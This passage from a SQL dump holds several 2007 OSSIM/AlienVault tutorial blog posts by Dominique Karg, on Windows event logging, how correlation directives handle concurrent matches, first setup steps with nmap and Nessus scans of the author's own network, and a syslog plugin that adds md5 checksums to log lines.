[HKEY_LOCAL_MACHINE/SOFTWARE/InterSect Alliance/AuditService/Config/Delimiter], it has to be set to ‘;’.Bounce snare (net stop snare, net start snare).Check logfiles (grep -i mswineventlog /var/log/ossim/*).Request help on forums/mailing lists.Referenceshttp://www.microsoft.com/technet/scriptcenter/scripts/msh/logs/default.mspx?mfr=truehttp://www.windowsnetworking.com/articles_tutorials/Monitoring-Troubleshooting-Event-Logs.htmlhttp://ossec.github.io/ConclusionWindows log integration isn’t perfect by default. The regular expression matching the above lines isn’t perfect for every language/event type, so some event’s might just end up in the “generic” category.OSSEC provides a bunch of nice features but already with Snare you can do really nice things.Attaching an md5sum to the received windows logs would again enable to be a bit more “compliant” with some regulations.', 'ossimcomplianceossecsnareeventlog', '/blogs/labs-research/tutorial-5-windows-event-logging');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (192, 'Tutorial 4: Correlation engine primer', 'Dominique Karg', 'December 18, 2007 ', 'IntroductionIn order to answer to a recent forum post https://sourceforge.net/forum/message.php?msg_id=4666889 [no longer available] I had to do a quick research since it had been some time since I last tested this.The exact question was:Hello,\n\n\n\nIs there a document talking about how the directives are processed?  One question\n\nthat I have is if you have multiple directives created and an event comes in\n\nthat matches the initial states of more than a single directive will both actually\n\nprocess the event, or only the first match (which I think is the case)?\n\n\n\nThanks for any clarification you can provide.\n\n\n\nStephenThis post gives a bit of insight to how the correlation engine works and features some simple, custom made directives that help me answer that question.The test environment features two events belonging to the ssh plugin (plugin_id 4003):SSH password failed (plugin_sid 1)SSH password accepted (plugin_sid 7)In order to test this I’ve created three directives (plugin_id 1505)Test directive 21, grouping one login failure and one successTest directive 22, grouping one login failure and one successTest directive 23, used in the second case, grouping those twoSo, with all of this in place it was easy to simulate this failing a login and succeeding afterwards.Case 1: Two concurrent correlation rulesDirectivesPut these into generic.xml for example <directive id=\"21\" name=\"Testing concurrency 1\" priority=\"5\">\n\n  <rule type=\"detector\" name=\"Level 1:1\" reliability=\"7\"\n\n    from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n    time_out=\"160\" plugin_id=\"4003\" plugin_sid=\"1\" >\n\n        <rules>\n\n                <rule type=\"detector\" name=\"Level 1:2\" reliability=\"10\"\n\n                occurrence=\"1\" from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n                plugin_id=\"4003\" plugin_sid=\"7\" />\n\n        </rules>\n\n  </rule>\n\n</directive>\n\n\n\n<directive id=\"22\" name=\"Testing concurrency 2\" priority=\"5\">\n\n  <rule type=\"detector\" name=\"Level 2:1\" reliability=\"7\"\n\n    from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n    time_out=\"160\" plugin_id=\"4003\" plugin_sid=\"1\" >\n\n        <rules>\n\n                <rule type=\"detector\" name=\"Level 2:2\" reliability=\"10\"\n\n                occurrence=\"1\" from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n                plugin_id=\"4003\" plugin_sid=\"7\" />\n\n        </rules>\n\n  </rule>\n\n</directive>Logs2007-12-10 04:19:56 OSSIM-Message: Event received: event id=\"0\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 04:19:53\" plugin_id=\"4003\" plugin_sid=\"1\" src_ip=\"10.0.1.3\" src_port=\"64270\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" asset_src=\"1\" asset_dst=\"1\"\n\nlog=\"Dec 10 04:19:53 ossim sshd[11366]: Failed password for root from 10.0.1.3 port 64270 ssh2\"\n\nusername=\"root\" \n\n\n\n2007-12-10 04:20:06 OSSIM-Message: Event received: event id=\"0\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 04:20:05\" plugin_id=\"4003\" plugin_sid=\"7\" src_ip=\"10.0.1.3\" src_port=\"64270\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" asset_src=\"1\" asset_dst=\"1\"\n\nlog=\"Dec 10 04:20:05 ossim sshd[11366]: Accepted password for root from 10.0.1.3 port 64270 ssh2\"\n\nusername=\"root\" \n\n\n\n2007-12-10 04:20:06 OSSIM-Message: Event received: event id=\"3\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 04:20:06\" plugin_id=\"1505\" plugin_sid=\"21\" src_ip=\"10.0.1.3\" src_port=\"64270\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" priority=\"5\" reliability=\"10\"\n\nasset_src=\"1\" asset_dst=\"1\" data=\"directive_event: Testing concurrency 1, Priority: 5\n\nRule 1 [2007-12-10 04:20:00] [4003:1] [Rel: 7] 10.0.1.3:64270 -> 0.0.0.0:0\n\nRule 2 [2007-12-10 04:20:06] [4003:7] [Rel: 10] 10.0.1.3:64270 -> 0.0.0.0:0\n\n\" \n\n\n\n2007-12-10 04:20:07 OSSIM-Message: Event received: event id=\"4\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 04:20:06\" plugin_id=\"1505\" plugin_sid=\"22\" src_ip=\"10.0.1.3\" src_port=\"64270\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" priority=\"5\" reliability=\"10\"\n\nasset_src=\"1\" asset_dst=\"1\" data=\"directive_event: Testing concurrency 2, Priority: 5\n\nRule 1 [2007-12-10 04:20:01] [4003:1] [Rel: 7] 10.0.1.3:64270 -> 0.0.0.0:0\n\nRule 2 [2007-12-10 04:20:06] [4003:7] [Rel: 10] 10.0.1.3:64270 -> 0.0.0.0:0ExplanationHere we wrote two directives with exactly the same events matching, naming it differently. That way we’ll be able to answer the concurrency question since I honestly don’t remember how that part worked.As you can see in the logs, two events arrived, and two directives got matched.Result: two alarms(Image removed, broken link, I’m very sorry. DK.)Case 2: Two concurrent correlation rules, a third grouping ruleDirectives<directive id=\"21\" name=\"Testing concurrency 1\" priority=\"5\">\n\n  <rule type=\"detector\" name=\"Level 1:1\" reliability=\"7\"\n\n    from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n    time_out=\"160\" plugin_id=\"4003\" plugin_sid=\"1\" >\n\n        <rules>\n\n                <rule type=\"detector\" name=\"Level 1:2\" reliability=\"10\"\n\n                occurrence=\"1\" from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n                plugin_id=\"4003\" plugin_sid=\"7\" />\n\n        </rules>\n\n  </rule>\n\n</directive>\n\n\n\n<directive id=\"22\" name=\"Testing concurrency 2\" priority=\"5\">\n\n  <rule type=\"detector\" name=\"Level 2:1\" reliability=\"7\"\n\n    from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n    time_out=\"160\" plugin_id=\"4003\" plugin_sid=\"1\" >\n\n        <rules>\n\n                <rule type=\"detector\" name=\"Level 2:2\" reliability=\"10\"\n\n                occurrence=\"1\" from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n                plugin_id=\"4003\" plugin_sid=\"7\" />\n\n        </rules>\n\n  </rule>\n\n</directive>\n\n\n\n<directive id=\"23\" name=\"Aggregated test directive\" priority=\"5\">\n\n  <rule type=\"detector\" name=\"Directive 1\" reliability=\"7\"\n\n    from=\"ANY\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n    time_out=\"160\" plugin_id=\"1505\" plugin_sid=\"21,22\" >\n\n        <rules>\n\n                <rule type=\"detector\" name=\"Directive 2\" reliability=\"10\"\n\n                occurrence=\"1\" from=\"ANY\" time_out=\"300\" to=\"ANY\" port_from=\"ANY\" port_to=\"ANY\"\n\n                plugin_id=\"1505\" plugin_sid=\"21,22\" sticky=\"true\" sticky_different=\"SRC_IP\" />\n\n        </rules>\n\n  </rule>\n\n</directive>Logs2007-12-10 06:24:56 OSSIM-Message: Event received: event id=\"0\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 06:24:55\" plugin_id=\"4003\" plugin_sid=\"7\" src_ip=\"10.0.1.3\" src_port=\"64620\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" asset_src=\"1\" asset_dst=\"1\"\n\nlog=\"Dec 10 06:24:55 ossim sshd[19967]: Accepted password for root from 10.0.1.3 port 64620 ssh2\"\n\nusername=\"root\" \n\n\n\n2007-12-10 06:24:56 OSSIM-Message: Event received: event id=\"35\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 06:24:56\" plugin_id=\"1505\" plugin_sid=\"21\" src_ip=\"10.0.1.3\" src_port=\"64620\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" priority=\"5\" reliability=\"10\"\n\nasset_src=\"1\" asset_dst=\"1\" data=\"directive_event: Testing concurrency 1, Priority: 5\n\nRule 1 [2007-12-10 06:24:51] [4003:1] [Rel: 7] 10.0.1.3:64620 -> 0.0.0.0:0\n\nRule 2 [2007-12-10 06:24:56] [4003:7] [Rel: 10] 10.0.1.3:64620 -> 0.0.0.0:0\n\n\" \n\n\n\n2007-12-10 06:24:56 OSSIM-Message: Event received: event id=\"36\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 06:24:56\" plugin_id=\"1505\" plugin_sid=\"22\" src_ip=\"10.0.1.3\" src_port=\"64620\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" priority=\"5\" reliability=\"10\"\n\nasset_src=\"1\" asset_dst=\"1\" data=\"directive_event: Testing concurrency 2, Priority: 5\n\nRule 1 [2007-12-10 06:24:51] [4003:1] [Rel: 7] 10.0.1.3:64620 -> 0.0.0.0:0\n\nRule 2 [2007-12-10 06:24:56] [4003:7] [Rel: 10] 10.0.1.3:64620 -> 0.0.0.0:0\n\n\" \n\n\n\n2007-12-10 06:24:56 OSSIM-Message: Event received: event id=\"37\" alarm=\"0\" type=\"detector\"\n\ndate=\"2007-12-10 06:24:56\" plugin_id=\"1505\" plugin_sid=\"23\" src_ip=\"10.0.1.3\" src_port=\"64620\"\n\ndst_ip=\"0.0.0.0\" sensor=\"10.0.1.50\" interface=\"eth2\" protocol=\"OTHER\" priority=\"5\" reliability=\"10\"\n\nasset_src=\"1\" asset_dst=\"1\" data=\"directive_event: Aggregated test directive, Priority: 5\n\nRule 1 [2007-12-10 06:24:56] [1505:21] [Rel: 3] 10.0.1.3:64620 -> 0.0.0.0:0\n\nRule 2 [2007-12-10 06:24:56] [1505:22] [Rel: 10] 10.0.1.3:64620 -> 0.0.0.0:0ExplanationThis is exactly the same event as before with two added features: a grouping directive with our two recently created directives and a couple of keywords that prevent our grouping directive to fire twice, since the same event is used for level 1 and level 2. Using sticky=“true” and sticky_different=“SRC_IP” we are telling the engine to not spawn a second instance of the directive if it comes from the same source IP.I think everything is quite self-explanatory.Result: one alarm, grouping two othersFoot noteI’ve detected some glitches during these tests, mainly in the alarm panel grouping code. As you can see on the screenshots event count isn’t correctly interpreted and separate alarms are being spawned, besides the grouped one. I’ll check that asap.', 'tutorialossimcorrelationdirectives', '/blogs/labs-research/tutorial-4-correlation-engine-primer');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (193, 'Tutorial 3: First recommended steps after installation', 'Dominique Karg', 'December 7, 2007 ', 'This tutorial tries to show the first common steps you could perform if you’re new to ossim and just finished installation, without knowing what to do next.The tutorial will cover:PoliciesInitial InventoryScansScheduled scansWhat to do nextMany topics we’ll cover on this tutorial can be extended checking the documentation wiki http://www.ossim.net/dokuwiki/doku.php?id=user_manual:introduction [no longer available].Asset definition: the quick wayOk, first we should populate our asset database a bit. I’m pretty sure I know my home network/testing environment pretty well, but this could change on a larger scale network or an unknown environment.The first thing I’ll do is to ask the administrator (that is, myself) about the networks we’ve got and which are directly or indirectly seen by ossim.The answer is two networks:Public/internal network, connected to the gateway. It’s a class C network in the 192.168.1.x range.Private/internal network, the one served by my AP. It’s a class C network too but since dhcp assigns addresses starting at 10.0.1.2 and I’ve got only a couple of hosts I’ll choose a smaller network (/28)NetworksSo let’s start by adding those networks with a default priority and rrd profile, without nessus scanning activated:(Image removed, broken link, I’m very sorry. DK.)Networks are very important and you should define as many as you’ve got, even if ossim is not directly connected to them. This is because hosts defined in DB or belonging to a network are being treated differently and more information for them is being used (Passive OS and Service information only gets saved for defined hosts/hosts belonging to defined networks).Network groupsNetwork groups are being used to aggregate information in case you’ve got many networks. In my case it’s ridiculous, but we’ve got customers with hundreds of networks where they couldn’t live without this feature :-)You can group by any criteria you want, either division, building, network ranges, whatever:(Image removed, broken link, I’m very sorry. DK.)In this case we’re raising the threshold a bit since aggregated networks are supposed to raise more events than individual hosts / networks. 100 may be too low, but it’s a matter of practice / experience and varies for each environment.Group information is specially useful for risk related panels, such as aggregated risk and riskmeter, preventing your pages from growing too much. Individual networks will be highlighted if their compromise or attack gets over their threshold:(Image removed, broken link, I’m very sorry. DK.)Hint: If you click on the colored area of the risk graph you’ll be redirected to the hosts involved in that risk peak. If you click on the host you’ll get redirected to the event listing that has created that risk situation.(Image removed, broken link, I’m very sorry. DK.)NetscanSo, next we would like to define a couple of hosts in order to personalize their asset information and to run reports and scans on them, and not on the entire network.Hosts can be inserted manually as we’ll see on the next point, but it’s much easier to let ossim scan them using nmap and give some default data for all of them to be inventoried. Again my example is a bit short on hosts (only two), but think about a bunch of class C networks and the work you could save.So we get to tools->netscan, select our private network and voila:(Image removed, broken link, I’m very sorry. DK.)Note: depending on the size of your network this may take a while, and an php timeout would make this page unusable. You might want to increase php’s max data size and session expiration.HostsSince I don’t really want to wait for a scan on my other class C network I’ll insert them manually, as seen on the next images.(Image removed, broken link, I’m very sorry. DK.)As an added benefit, you’ll be able to see all the collected information about each host you define here:(Image removed, broken link, I’m very sorry. DK.)GroupsNow we’ll do our first nessus scan. Let’s scan only the workstations, leaving the gateways untouched. We could enable them one by one, yes, but again that can get tiring for many hosts. The ideal solution is to create groups (you can create as many as you wish, having hosts in different groups too) so you can later on apply separate scan types and schedules on them.Let’s create a simple one, as said, only workstations: (we’ll use it later)(Image removed, broken link, I’m very sorry. DK.)OCS InventoryHaving extended inventory information from your hosts is also useful. See  the old tutorial on OCS for more information on how to setup OCS. Hint: execute the installer as part of your logon scripts on a domain, that way you’ll get a lightning fast inventory of your whole network.Nessus ScanUsing the group we created before, we’ll check how vulnerable my workstations are.(Image removed, broken link, I’m very sorry. DK.)Unf, 8. That’s not much, but taking into account that each vulnerability can have a level ranging from 0 to 10, I should look at the reports by clicking on the host.Aaah, almost forgot it. Since my vulnerability_incident_threshold at configuration->main is set to “0”, every vulnerability with level 0 or higher will create a new incident too, as we can see here:(Image removed, broken link, I’m very sorry. DK.)Note: Vulnerability incidents are able to handle false positives too. If you close it and tag it as false positive, it won’t be opened on the next scan. But be warned, if you close it and it’s not tagged, it will get opened again next time. That way you’ll can happily close the incident when your sysadmin says he’s patched the hole, knowing that if he has lied he’ll have that incident on the table next month again :-)(Image removed, broken link, I’m very sorry. DK.)Hint: you can check to see if the scan is actually working by grepping on the agent, since the information shown during scan ain’t very verbose.Hint2: Nessus scan is distributed, that is, ossim tries to find the sensor associated to the target in order to scan from there.ossim:~# ps ax | grep nessus\n\n 2536 ?        Ss     0:00 nessusd: waiting for incoming connections\n\n 6600 ?        S      0:00 /usr/bin/nessus -c /usr/share/ossim/www/vulnmeter/tmp/.nessusrc\n\n-x -T nsr -q 10.0.1.50 1241\n\n/usr/share/ossim/www/vulnmeter/tmp/sensors/10.0.1.50.targets.txt\n\n/usr/share/ossim/www/vulnmeter/tmp/sensors/10.0.1.50.temp_res.nsr\n\n 6606 ?        Ss     0:03 nessusd: serving 10.0.1.50\n\n 6614 ?        S      0:00 nessusd: testing 10.0.1.3\n\n 6615 ?        S      0:00 nessusd: testing 192.168.1.33\n\n 6618 ?        S      0:00 nessusd: testing 192.168.1.33 (/var/lib/nessus/plugins/nessus_tcp_scanner.nes)\n\n 6619 ?        S      0:00 nessusd: testing 10.0.1.3 (/var/lib/nessus/plugins/nessus_tcp_scanner.nes)\n\n 6625 pts/0    R+Schedule scansFinally, let’s leave a scan scheduled to execute once a month:(Image removed, broken link, I’m very sorry. DK.)Final wordsThat’s all for today, it may shed a bit of light on some easy to use, basic features of ossim. If you followed these steps you can be pretty sure that you’ll start getting more and more useful information out of the system.Check the monitors, reports and dashboards and you’ll see how your asset information starts to affect all the indicators.(Image removed, broken link, I’m very sorry. DK.)The next thing I’d recommend is checking out the tools at “Tools->Downloads” and install ossec and ocs, in order to get even more information out of your network’s hosts.(Image removed, broken link, I’m very sorry. DK.)', 'tutorialinstallerinventory', '/blogs/labs-research/tutorial-3-first-recommended-steps-after-installation');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (194, 'Tutorial 2: Syslog data mining with attached md5sum. AKA \"Store 100% of data\".', 'Dominique Karg', 'December 6, 2007 ', '1. The need. The Hype.There’s obviously a need for storing vast amount of logs, and few things today aren’t able to log into syslog. So it’s just obvious to stumble upon that request every once in a while, and this tutorial illustrates the OSSIM approach at massive syslog data storage. Of course, where you say syslog you can say windows event log, snmp data, whatever generates a big amount of raw data.ComplianceI don’t know much yet about all of this compliance stuff (I were lucky, Julio always has been much more knowledgeable on that area than me so I could skip it) but I guess I’ll have to start learning, there are just too many people asking for it and I’m getting very curious.From what I’ve seen, a short list of regulations requiring, or at least strongly recommending a certain amount of raw data storage and reports are:ISO27001/17799SOXHIPAAPCIBasel IINIST 800-53Many more…(Searching for SIM and compliance information I see that’s a major marketing point from vendors too, well, just for the records, ossim helps you to be compliant with all that stuff)Centralized loggingMaybe the need is pure sysadmin’s lazyness. You want to be able to answer to questions you get asked by your management / customers in the easiest possible way.I heard this from a guy a couple of days ago: the more information about your network you’ve got, the more answers you can give, and that’s exactly what SIM/SEM systems are good at.Data miningThis is a bit redundant with the previous entry, but there are people that just don’t care about exact data, but they’re in desperate need of colorful graphs in order to be able to keep their bosses calm. Well, having logs from everything in your network allows for easy colorful report generation with little knowledge of the underlying data. The worthyness of those reports in the end will be highly questionable of course.2. The preparation.I thought it would be interesting to explain the process we used to create this plugin in the first time here, so it will be a hybrid tutorial: syslog and how to fetch your own datasources.Write a new functionWell, the first thing that came to my mind was that, even without knowing much about those compliance regulations, if they’ve been designed with at least a bit of common sense they’ll require a digital cryptographic stamp on the logs. So let’s just add a little function to our plugin environment that does just that: timestamping using md5.def md5sum(datastring):\n\n    return md5.new(datastring).hexdigest();Just put your functions into ParserUtils.py and they’re available for all plugins. That file usually resides at /usr/share/ossim-agent/ossim_agent/.Write a new pluginThe next thing we’ll do is create a new plugin. We want this plugin to:Get every single syslog lineRespect the orignal loglineChecksum that lineAfter a bit of toying I’ve seen it would be easy to also:Extract the sensor from the lineExtract the source ipExtract the originating processExtract the PIDExtract the line without the “changing” partAll of this while respecting the original line of course.;; syslog\n\n;; plugin_id: 4007\n\n;; type: detector\n\n;;\n\n\n\n[DEFAULT]\n\nplugin_id=4007\n\n\n\n[config]\n\ntype=detector\n\nenable=yes\n\n\n\nsource=log\n\n# Enable syslog to log everything to one file. Add it to log rotation also.\n\n# echo \"*.*     /var/log/all.log\" >> /etc/syslog.conf; killall -HUP syslogd\n\nlocation=/var/log/all.log\n\n\n\n# create log file if it does not exists,\n\n# otherwise stop processing this plugin\n\ncreate_file=true\n\n\n\nprocess=\n\nstart=no\n\nstop=no\n\nstartup=\n\nshutdown=\n\n\n\n## rules\n\n\n\n[syslog - datamining]\n\n# Sep  6 12:07:26 ossim-devel su[9886]: FAILED su for root by juanma\n\nevent_type=event\n\nregexp=\"^(?P(\\S+\\s+\\d+\\s+\\d\\d:\\d\\d:\\d\\d)\\s+(?P[^\\s]+)\\s+(?P\n[^\\s]+)\\s+(?P[^\\[]*)\\[(?P \\d+)\\]:(?P.*))$\" sensor={resolv($sensor)} date={normalize_date($1)} plugin_sid=1 sensor={resolv($sensor)} userdata1={md5sum($logline)} userdata2={$logline} userdata3={$generator} userdata4={$logged_event} userdata5={$pid}This is quite a simple plugin. Only one rule, a relatively simple regexp, you may notice the md5sum function being used, as well as a couple of others.We don’t really need to extract the fields here but that will make getting reporting done for this plugin a very very easy task.Write the SQLNext thing we have to do is make the server aware of our new plugin. We’ll assign it ID 4007 since it’s free and it’s in the range reserved for syslog, and insert only one event.Please notice this event is being inserted with priority 0, more on this later. DELETE FROM plugin WHERE id = \"4007\";\n\nDELETE FROM plugin_sid where plugin_id = \"4007\";\n\nINSERT INTO plugin (id, type, name, description)\n\nVALUES (4007, 1, \'syslog\', \'Syslog plugin with md5 checksum logging\');\n\nINSERT INTO plugin_sid (plugin_id, sid, category_id, class_id, name, priority, reliability)\n\nVALUES (4007, 1, NULL, NULL, \'Syslog: syslog entry\' , 0, 1); Priority 0Inserting the event with priority 0 is a little trick that helps us preventing these items from generating noise to our SIM system.By default, each incoming event as an instant risk value calculated as:risk = asset * priority * reliability / 25So, what would happen if this plugin is activated and you enable debugging on an app that generates a thousand log lines ? Well, that host would be treated as compromised, alarms would raise, and many indicators would be affected by this false positive.Since we actually only want to store events, not assess any instant risk with them, one of three variables on the multiplication should be set to 0 for this type of events to be ignored by the risk assessment system by default (they would still be correlated, forwarded, could become alarms, etc. etc…). We can’t control the assets, and the event’s reliability can only be modified by correlation rules. Wouldn’t it be nice to be able to decide which events to take into account or not based on our policy ? well, the obvious choice is priority, since correlation rules can affect both priority as well as reliability and policies only affect priorities.That means if we want specific source ips or generators to behave differently, we can control it via policy, and if we want to generate alarms, correlate with other events or based on some of the extracted fields, we do it using directives (correlation rules).Enable syslog loggingThere are better ways of getting all the logs into one file without duplicating but just for the records sake, I added “*.* /var/log/all.log” to /etc/syslog.conf and restarted the service. That way we can point our plugin at that file and forget about filtering.Enable remote loggingRemote logging is similar, but entering “*.* @agent_ip” instead into the syslog file and restarting. Here is my output on MacosX:Gestalt:etc dk$ sudo vi syslog.conf\n\nGestalt:etc dk$ ps ax | grep syslog\n\n   13   ??  Ss     0:04.84 /usr/sbin/syslogd\n\n 3994 s004  R+     0:00.00 grep syslog\n\nGestalt:etc dk$ sudo kill -HUP 13\n\nGestalt:etc dk$ syslog -s test\n\n\n\nOn our tail -f /var/log/all.log:\n\n\nDec  6 07:10:12 10.0.1.3 Gestalt syslog[3997]: test 3. The implementation.Update 2008/03/11: Fixed the regexp, as can be seen in comments below it was too narrow. Just re-download the .cfg.txtCopy plugin to it’s placeThe plugin file should be put into /etc/ossim/agent/plugins/syslog.cfg.Insert SQLThe SQL can be inserted from the server as:cat syslog.sql.txt | mysql -p -uroot ossimNote to the installer users: you can get your database password from /etc/ossim/ossim_setup.conf as root, grepping for “pass” since it gets generated at install randomly for each installation. That password is also used for ntop, nessus, etc…Restart serverThere are nicer ways but this works:killall ossim-server; ossim-server -dEnable pluginAdd a line like this to your /etc/ossim/agent/config.cfg, into the [plugins] section.syslog=/etc/ossim/agent/plugins/syslog.cfgRestart agentkillall ossim-agent; ossim-agent -dDoes it work ? RT event viewer.The best way to see if an event traverses through generator—> agent—> server—> database is to fire up the RealTime event viewer and start it selecting “fast”.Here you can see they’re starting to arrive:(Image removed, broken link, I’m very sorry. DK.)4. The results.That’s it, the data is being fed into the database. What now?PolicyFirst of all, remember that the event’s won’t affect our risk but they’re still getting stored.WARNING: If you abuse this, your database won’t be able to handle the load from all that data. You’re going to store it, but with little use. Default OSSIM is not tuned for more than 1, 1.5 Million active events in database. That’s more than enough for a small/home user, but way too much if you feed it with 2000 syslogging devices.So what could you do ? store only part of the data using policies when you need it, correlating all events for more interesting stuff. This obviously doesn’t help if you came here looking for better compliance. (See below, sections 5 and 6).Following are a couple of hints about how to create a policy that only stores events from a single syslog host.Create a host: (Image removed, broken link, I’m very sorry. DK.)Create a plugin group with syslog plugins: (Image removed, broken link, I’m very sorry. DK.)Select the generating host as source (you could also apply this to a sensor, and any hosts it receives) (Image removed, broken link, I’m very sorry. DK.)Disable everything, just store (or leave correlation enabled for these events if you wish) (Image removed, broken link, I’m very sorry. DK.)Create a drop-everything else policy: (Image removed, broken link, I’m very sorry. DK.)The result: (Image removed, broken link, I’m very sorry. DK.)PerformanceI’ll just throw in the warning in again:WARNING: If you abuse this, your database won’t be able to handle the load from all that data. You’re going to store it, but with little use. Default OSSIM is not tuned for more than 1, 1.5 Million active events in database. That’s more than enough for a small/home user, but way too much if you feed it with 2000 syslogging devices.Which basically means: if you’ve got few devices (at most 200000 events a day) you can go for “logging everything” with the default installer ossim. Otherwise you’ll have to heavily tune your database, enable “writing into filesystem” and/or play some other DB tricks. See section 6 below.Event viewerSince we’ve already separated our info into bits, besides of keeping the whole original line, we can easily create a new event viewer panel for this specific plugin.In this example below, I created one with four columns, and label:data relations such as:DATE:DATEChecksum:USERDATA1Generator:USERDATA3Log:USERDATA4(Image removed, broken link, I’m very sorry. DK.)Note: log is not the entire line, that would be USERDATA2 as you can see on our plugin.ReportsWhat else do we need to be able to tell our boss that we’re now much closer to being compliant ? nifty graphs :-)Let’s define a new tab (using a nice icon from images.google.com) and put two panels in there, a simple graph with our top 5 generated logs and a cloud with all the generators.Tab: (Image removed, broken link, I’m very sorry. DK.)Cloud definition: (Image removed, broken link, I’m very sorry. DK.)Cloud SQL: (Image removed, broken link, I’m very sorry. DK.)Resulting graph: (Image removed, broken link, I’m very sorry. DK.)Note: The pie graph is of type “SQL”, using rows as labels, 45 degree rotation. Here is the export you can import into your panel: plugin_custom_sql::\n\nYTo0OntzOjY6InBsdWdpbiI7czoyMjoicGx\n\n1Z2luX2NvbmZpZ19leGNoYW5nZSI7czoxMT\n\noicGx1Z2luX29wdHMiO2E6Mjc6e3M6ODoiZ\n\n3JhcGhfZGIiO3M6NToic25vcnQiO3M6OToi\n\nZ3JhcGhfc3FsIjtzOjIxOToic2VsZWN0IHV\n\nzZXJkYXRhNCwgY291bnQoKikgYXMgbnVtIG\n\nZyb20gZXh0cmFfZGF0YSwgb3NzaW1fZXZlb\n\nnQgd2hlcmUgb3NzaW1fZXZlbnQuc2lkID0g\n\nZXh0cmFfZGF0YS5zaWQgYW5kIG9zc2ltX2V\n\n2ZW50LmNpZCA9IGV4dHJhX2RhdGEuY2lkIG\n\nFuZCBvc3NpbV9ldmVudC5wbHVnaW5faWQgP\n\nSA0MDA3IGdyb3VwIGJ5IHVzZXJkYXRhNCBv\n\ncmRlciBieSBudW0gZGVzYyBsaW1pdCA1Owo\n\nKIjtzOjExOiJncmFwaF90aXRsZSI7czoyMj\n\noiVG9wIDUgc3lzbG9nIHByb2Nlc3NlcyI7c\n\nzoxMDoiZ3JhcGhfdHlwZSI7czozOiJwaWUi\n\nO3M6MTg6ImdyYXBoX2xlZ2VuZF9maWVsZCI\n\n7czozOiJyb3ciO3M6MTY6ImdyYXBoX3Bsb3\n\nRzaGFkb3ciO3M6MToiMCI7czoxNToiZ3Jhc\n\nGhfcGllX3RoZW1lIjtzOjU6IndhdGVyIjtz\n\nOjE3OiJncmFwaF9waWVfM2RhbmdsZSI7czo\n\nyOiI0NSI7czoxNzoiZ3JhcGhfcGllX2V4cG\n\nxvZGUiO3M6NDoibm9uZSI7czoyMToiZ3Jhc\n\nGhfcGllX2V4cGxvZGVfcG9zIjtzOjE6IjEi\n\nO3M6MjI6ImdyYXBoX3BpZV9hbnRpYWxpYXN\n\npbmciO3M6MToiMSI7czoxNjoiZ3JhcGhfcG\n\nllX2NlbnRlciI7czozOiIwLjIiO3M6MTg6I\n\nmdyYXBoX3BvaW50X2xlZ2VuZCI7czowOiIi\n\nO3M6MTc6ImdyYXBoX3Nob3dfdmFsdWVzIjt\n\nzOjE6IjEiO3M6MTE6ImdyYXBoX2NvbG9yIj\n\ntzOjc6IiMwMDAwODAiO3M6MTQ6ImdyYXBoX\n\n2dyYWRpZW50IjtzOjE6IjAiO3M6MTA6Imdy\n\nYXBoX2xpbmsiO3M6MDoiIjtzOjE2OiJncmF\n\nwaF9yYWRhcl9maWxsIjtzOjE6IjEiO3M6MT\n\nE6ImdyYXBoX3lfbWluIjtzOjE6IjAiO3M6M\n\nTE6ImdyYXBoX3lfbWF4IjtzOjE6IjAiO3M6\n\nMTE6ImdyYXBoX3hfbWluIjtzOjE6IjAiO3M\n\n6MTE6ImdyYXBoX3hfbWF4IjtzOjE6IjAiO3\n\nM6MTE6ImdyYXBoX3lfdG9wIjtzOjE6IjAiO\n\n3M6MTE6ImdyYXBoX3lfYm90IjtzOjE6IjAi\n\nO3M6MTE6ImdyYXBoX3hfdG9wIjtzOjE6IjA\n\niO3M6MTE6ImdyYXBoX3hfYm90IjtzOjE6Ij\n\nAiO3M6MTU6ImV4cG9ydGVkX3BsdWdpbiI7c\n\nzoxNzoicGx1Z2luX2N1c3RvbV9zcWwiO31z\n\nOjExOiJ3aW5kb3dfb3B0cyI7YTozOntzOjI\n\n6ImlkIjtzOjM6IjF4MSI7czo1OiJ0aXRsZS\n\nI7czoxMDoiVG9wIDUgbG9ncyI7czo0OiJoZ\n\nWxwIjtzOjA6IiI7fXM6MTE6Im1ldHJpY19v\n\ncHRzIjthOjQ6e3M6MTQ6ImVuYWJsZV9tZXR\n\nyaWNzIjtzOjE6IjAiO3M6MTA6Im1ldHJpY1\n\n9zcWwiO3M6OToic2VsZWN0IDQ7IjtzOjEzO\n\niJsb3dfdGhyZXNob2xkIjtzOjE6IjMiO3M6\n\nMTQ6ImhpZ2hfdGhyZXNob2